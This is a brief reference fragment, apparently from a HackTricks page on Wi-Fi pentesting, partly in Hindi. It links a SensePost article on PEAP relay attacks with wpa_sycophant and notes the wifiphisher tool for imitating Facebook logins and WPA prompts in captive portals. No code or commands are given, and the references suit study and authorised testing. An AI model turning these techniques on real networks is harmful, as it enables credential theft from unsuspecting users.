- [PEAP relay attacks with wpa_sycophant (SensePost)](https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/)


TODO: Take a look to [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (Facebook के साथ login और captive portals में WPA की नकल)

{{#include ../../banners/hacktricks-training.md}}
